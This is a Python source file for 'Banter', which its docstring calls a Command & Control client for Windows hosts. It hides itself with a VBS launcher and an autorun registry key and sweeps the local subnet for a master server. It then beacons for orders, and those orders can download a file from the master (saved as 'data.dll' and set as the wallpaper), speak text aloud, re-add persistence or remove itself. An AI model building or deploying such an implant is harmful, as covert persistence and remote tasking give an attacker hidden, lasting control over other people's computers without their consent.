"""Client component of the Banter project."""
import argparse
import io
import ipaddress
import logging
import os
import socket
import subprocess
import sys
import time

import netifaces
import win32api
import win32com.client
import win32con
import win32gui


class Banter():
    """Client that performs tasking after establishing a connection with the Command & Control server, the Master."""

    def __init__(self, debug_build=False, persist=True):
        """Initialise logging, constants and retrieve host workstation name.

        @param debug_build: turn on debug logging
        @param persist: whether or not to persist reboots by adding an autorun registry key entry
        """
        if debug_build:
            logging.basicConfig(level=logging.DEBUG)
            logging.debug("Debug build")
        else:
            logging.basicConfig(level=logging.CRITICAL)
        self.PERSISTENCE_KEY = """Software\\Microsoft\\Windows\\CurrentVersion\\Run"""
        self.REG_KEY_ENTRY = "data"
        self.PORT = 34072
        self.TASKING_PORT = 34073
        self.BUFFER_SIZE = 8192
        self.TASKING_WINDOW = 10
        self.FIND_MASTER_LIMIT = 16
        if logging.getLogger().level == logging.DEBUG:
            self.MASTER_SEARCH_SLEEP = 10
        else:
            self.MASTER_SEARCH_SLEEP = 60
        # How many empty tasking windows before trying to find master again
        # 60 * tasking window (10) = 10 minutes
        self.LAST_HEARD_LIMIT = 60
        # How many times to attempt a connection before aborting
        self.CONNECTION_ATTEMPT_LIMIT = 5
        # Whether or persistence should be added on this run
        self.PERSIST = persist

        self.name = self.get_name()
        logging.debug("Name: {0}".format(self.name))
        self.master = None
        self.gateway = None

        self.client_interface = None
        self.client_network = None

        self.find_master_window = 2

    def get_name(self):
        """Return the host workstation name, or 'Unnamed' if the appropriate registry key cannot be found."""
        try:
            key = win32api.RegOpenKeyEx(win32con.HKEY_LOCAL_MACHINE,
                                        """SYSTEM\\CurrentControlSet\\Control\\ComputerName\\ActiveComputerName""",
                                        0, win32con.KEY_QUERY_VALUE)
            name = win32api.RegQueryValueEx(key, "ComputerName")[0]
            win32api.RegCloseKey(key)
        except:
            name = "Unnamed"
        return name

    def persist(self, persist):
        """Add/Remove persistence to reboots by adding a registry key entry which autoruns a vbs script on boot.

        The vbs script is required in order to run this component silently and is created/removed during this method.
        This method is automatically called to add persistence during initialisation and remove persistence during
        the kill routine.
        @param persist: whether to add or remove persistence
        """
        dir_name = os.path.dirname(os.path.abspath(__file__))
        vbs_script_file = os.path.join(dir_name, "data.vbs")
        if persist:
            if not os.path.exists(vbs_script_file):
                curr_file = win32api.GetModuleFileName(0)
                target_exe = os.path.basename(curr_file)
                if target_exe == "python.exe":
                    logging.debug("Running as python script, adding args to persistence script.")
                    curr_file = win32api.GetCommandLine()
                vbs_script = open(vbs_script_file, "w")
                # Windows doesn't like it when something being executed using the autorun registry key being used here
                # modifies the registry, so the '-r' argument is passed to this script to disable the persistence
                # adding routine on bootup.
                vbs_script.write('Dim WShell\nSet WShell = CreateObject("Wscript.Shell")\nWShell.Run "{0} -r", 0\nSet WShell = Nothing'.format(curr_file))   # nopep8
                vbs_script.close()
                startup_script = "wscript \"{0}\"".format(vbs_script_file)
                curr_script = None
                try:
                    key = win32api.RegOpenKeyEx(win32con.HKEY_CURRENT_USER, self.PERSISTENCE_KEY, 0,
                                                win32con.KEY_QUERY_VALUE)
                    curr_script = win32api.RegQueryValueEx(key, self.REG_KEY_ENTRY)
                    win32api.RegCloseKey(key)
                except Exception as e:
                    logging.exception("Unhandled Exception: {0}".format(e))
                # if curr_script is None (no value) or incorrect, replace with correct one
                if startup_script != curr_script:
                    logging.debug("Adding {0} to run on startup...".format(curr_file))
                    logging.debug("Script executed by registry key on boot: {0}".format(startup_script))
                    try:
                        key = win32api.RegOpenKeyEx(win32con.HKEY_CURRENT_USER, self.PERSISTENCE_KEY, 0,
                                                    win32con.KEY_SET_VALUE)
                        win32api.RegSetValueEx(key, self.REG_KEY_ENTRY, 0, win32con.REG_SZ,
                                               "{0}".format(startup_script))
                        win32api.RegCloseKey(key)
                    except Exception as e:
                        logging.exception("Unhandled Exception: {0}".format(e))
        else:
            logging.debug("Removing from startup...")
            if os.path.exists(vbs_script_file):
                logging.debug("Removing vbs script.")
                try:
                    os.remove(vbs_script_file)
                except Exception as e:
                    logging.exception("Unhandled Exception: {0}".format(e))
            try:
                key = win32api.RegOpenKeyEx(win32con.HKEY_CURRENT_USER, self.PERSISTENCE_KEY, 0,
                                            win32con.KEY_SET_VALUE)
                win32api.RegDeleteValue(key, self.REG_KEY_ENTRY)
                win32api.RegCloseKey(key)
            except Exception as e:
                logging.exception("Unhandled Exception: {0}".format(e))

    def find_master(self):
        """Search for and perform handshake with Master.

        If run for the first time, or the old Master is not responding, the client will perform a network sweep of the
        current subnet and search for a new Master.
        @return: True if Master is found
        """
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.settimeout(self.find_master_window)
        if self.master:
            if self.attempt_handshake(sock, self.master):
                logging.debug("Master found: {0}".format(self.master))
                sock.close()
                return True
            else:
                logging.debug("Old master {0} not responding, wiping.".format(self.master))
                self.master = None
        else:
            try:
                ips = self.determine_addresses()
            except:
                return False
            for address in ips:
                if self.attempt_handshake(sock, address):
                    logging.debug("Master found: {0}".format(address))
                    sock.close()
                    return True
            logging.debug("Master not found")
            if self.find_master_window < self.FIND_MASTER_LIMIT:
                # Progressively increase the socket timeout window to accommodate slow networks
                logging.debug("Increasing socket timeout")
                self.find_master_window *= 2
        sock.close()
        return False

    def determine_addresses(self):
        """Determine LAN subnet to be scanned in search of the Master.

        @return: a list of ipaddress.IPv4Address objects
        """
        # Attempt to use method 2, falling back to method 1 upon failure
        try:
            self.gateway, interface_uuid = self.determine_gateway2()
            if self.gateway is None or interface_uuid is None:
                self.gateway, interface_uuid = self.determine_gateway()
        except:
            self.gateway, interface_uuid = self.determine_gateway()

        # Generate a list of potential hosts
        interface = netifaces.ifaddresses(interface_uuid)
        self.client_interface = ipaddress.ip_interface('{0}/{1}'.format(interface[netifaces.AF_INET][0]['addr'],
                                                                        interface[netifaces.AF_INET][0]['netmask']))
        self.client_network = ipaddress.ip_network(self.client_interface.network)
        logging.debug("Client ip: {0}".format(self.client_interface))
        return list(self.client_network.hosts())

    def determine_gateway(self):
        """Return the address and interface of gateway marked as default."""
        try:
            logging.debug("Using default gateway...")
            gws = netifaces.gateways()
            default_gateway = gws['default'][netifaces.AF_INET]
            logging.debug(" * Success!")
            return default_gateway
        except:
            logging.debug(" * Failed!")
            raise

    def determine_gateway2(self):
        """Return the address and interface of the internet-facing gateway."""
        try:
            logging.debug("Using tracert to determine gateway address...")
            # Run a tracert to google.com
            output = subprocess.Popen(['tracert', '-4', '-d', '-h', '1', 'google.com'],
                                      stdout=subprocess.PIPE).communicate()[0]
            # Get rid of the heading crap and retrieve the first entry which contains the gateway IP
            i_gw = output.split(b"\r\n")[4].split()[-1].decode()

            gws = netifaces.gateways()[netifaces.AF_INET]
            # Look for the interface with the correct gateway IP
            for gw in gws:
                if gw[0] == i_gw:
                    logging.debug(" * Success!")
                    return gw[0], gw[1]
            logging.debug(" * Failed!")
            return None, None
        except:
            logging.debug(" * Failed!")
            raise

    def attempt_handshake(self, sock, address):
        """Attempt master handshake.

        @param sock: the socket object to send packets with
        @param address: the address to attempt the handshake with
        @return: True if handshake successful
        """
        logging.debug("Attempting linkup: {0}".format(address))
        try:
            sock.sendto(b"Speak friend and enter", (str(address), self.PORT))
            logging.debug("{0} < '{1}'".format(str(address), b"Speak friend and enter"))
            data, addr = sock.recvfrom(self.BUFFER_SIZE)
            logging.debug("{0} > '{1}'".format(addr[0], data))

            if data == b"RockMelon69":
                self.master = addr[0]
                info = bytes(self.name + "BossTha", "ascii")
                sock.sendto(info, addr)
                logging.debug("{0} < '{1}'".format(addr[0], info))
                return True
        except:
            pass
        return False

    def process_tasking(self):
        """Temporarily receive and acknowledge tasking from master.

        @return: True if tasking received within this processing window
        """
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.settimeout(self.TASKING_WINDOW)
        tasking_start = time.time()
        while time.time() < tasking_start + self.TASKING_WINDOW:
            try:
                sock.sendto(b"Awaiting orders", (self.master, self.TASKING_PORT))
                data, addr = sock.recvfrom(self.BUFFER_SIZE)
                logging.debug("{0} > {1}".format(addr[0], data))
                if addr[0] == self.master:
                    ack = data[:4] + b"BossTha"
                    logging.debug("{0} < {1}".format(addr[0], ack))
                    sock.sendto(ack, addr)
                    if self.parse_task(str(data, "ascii")):
                        self.send_task_result(True)
                    else:
                        self.send_task_result(False)
                    sock.close()
                    return True
            except ConnectionResetError:
                # Server currently not tasking, beacon didn't get thru
                time.sleep(2)
            except socket.timeout:
                # Beacon got thru, server didn't respond with task in time
                time.sleep(2)
        sock.close()
        return False

    def parse_task(self, task):
        """Parse and action tasks.

        @param task: the command string received from the Master
        @return: True if task is valid and completed successfully
        """
        task = task.split(",")
        if task[0] == "hi":
            return True
        elif task[0] == "cb":
            return self.change_background_task(int(task[1]))
        elif task[0] == "ss":
            return self.speak_task(task[1])
        elif task[0] == "kys":
            self.kill_task()
        elif task[0] == "sa":
            self.persist_task()
        else:
            return False

    def send_task_result(self, result):
        """Send an indication of task completion to the Master.

        @param result: Whether the task was completed successfully
        """
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
                if result:
                    sock.sendto(b"Jobs done!", (self.master, self.PORT))
                else:
                    sock.sendto(b"Nope", (self.master, self.PORT))
        except Exception as e:
            logging.exception("Unhandled Exception: {0}".format(e))

    def change_background_task(self, serving_port):
        """Task that attempts to change the host machine's background picture.

        @param serving_port: the port to connect back to the Master with and receive the intended picture
        @return: True if the task was completed successfully
        """
        # Download image from master
        image = self.request_file(serving_port)
        if image is None:
            logging.debug("Image download failed.")
            return
        logging.debug("Downloaded image.")
        logging.debug("File stored at: {0}".format(image))

        # Change background
        return self.set_background(image)

    def request_file(self, serving_port):
        """Retrieve the intended image from the Master.

        @param serving_port: the port to connect back to the Master with and receive the intended picture
        @return: absolute path to the image if the retrieval was successful, None otherwise
        """
        try:
            file_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            file_sock.settimeout(10)
            attempts = 0
            while True:
                attempts += 1
                if attempts > self.CONNECTION_ATTEMPT_LIMIT:
                    logging.debug("Connection failed.")
                    return None
                try:
                    file_sock.connect((self.master, serving_port))
                    break
                except Exception as e:
                    logging.warning("Unhandled Excpetion: {0}".format(e))
                    continue
        except Exception as e:
            logging.warning("Unhandled Exception: {0}".format(e))
            return None
        try:
            file_sock.send(b"plsehlp")
            logging.debug("{0} < '{1}'".format(self.master, b"plsehlp"))
            image = open("data.dll", "wb")
            data = file_sock.recv(self.BUFFER_SIZE)
            while data:
                image.write(data)
                data = file_sock.recv(self.BUFFER_SIZE)
            file_sock.close()
            path = image.name
            image.close()
            return os.path.abspath(path)
        except Exception as e:
            logging.warning("Unhandled Exception: {0}".format(e))
            return None
        finally:
            file_sock.close()

    def set_background(self, image):
        """Attempt to change the host machine's background by editing the appropriate registry key.

        @param image: the image to change the backgroudn to
        @return: True if the change was successful
        """
        logging.debug("Setting background to: {0}".format(image))
        try:
            key = win32api.RegOpenKeyEx(win32con.HKEY_CURRENT_USER, "Control Panel\\Desktop", 0,
                                        win32con.KEY_SET_VALUE)
            win32api.RegSetValueEx(key, "WallpaperStyle", 0, win32con.REG_SZ, "2")
            win32api.RegSetValueEx(key, "TileWallpaper", 0, win32con.REG_SZ, "0")
            win32gui.SystemParametersInfo(win32con.SPI_SETDESKWALLPAPER, image, 1+2)
            win32api.RegCloseKey(key)
            return True
        except Exception as e:
            logging.warning("Unhandled Exception: {0}".format(e))
            return False

    def speak_task(self, sentence):
        """Task that uses the Microsoft voice API to speak the specified sentence.

        @param sentence: the sentence to be spoken
        @return: True if task was successful
        """
        logging.debug("Speaking sentence: {0}".format(sentence))
        try:
            speak = win32com.client.Dispatch("SAPI.SpVoice")
            return speak.Speak(sentence)
        except Exception as e:
            logging.warning("Unhandled Exception: {0}".format(e))
            return False

    def kill_task(self):
        """Task that removes persistence and kills the Client."""
        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
            sock.sendto(b"Auf Wiedersehen...", (self.master, self.PORT))
        self.persist(False)
        sys.exit()

    def persist_task(self):
        """Task that enables persistence."""
        self.persist(True)
        return True

    def start(self):
        """Constantly search for or beacon out to the Master for tasking."""
        logging.debug("Starting up")
        if self.PERSIST:
            # Add to persistence
            self.persist(True)
        while True:
            logging.debug("Searching for master...")
            if self.find_master():
                # If Master found, begin beaconing for tasking
                self.find_master_window = 2
                last_heard = 0

                while last_heard < self.LAST_HEARD_LIMIT:
                    logging.debug("Processing tasking...")
                    if self.process_tasking():
                        last_heard = 0
                    else:
                        logging.debug("No tasking received.")
                        last_heard += 1
                logging.debug("No tasking received for too long. Relinking with master.")
            time.sleep(self.MASTER_SEARCH_SLEEP)

if __name__ == "__main__":
    """Mainline."""
    parser = argparse.ArgumentParser()
    parser.add_argument('-d', '--debug', default=False, help="Enable debug logging", action="store_true")
    parser.add_argument('-r', default=True, help="Don't add persistence", action="store_false")

    args = parser.parse_args()

    client = Banter(args.debug, args.r)
    client.start()
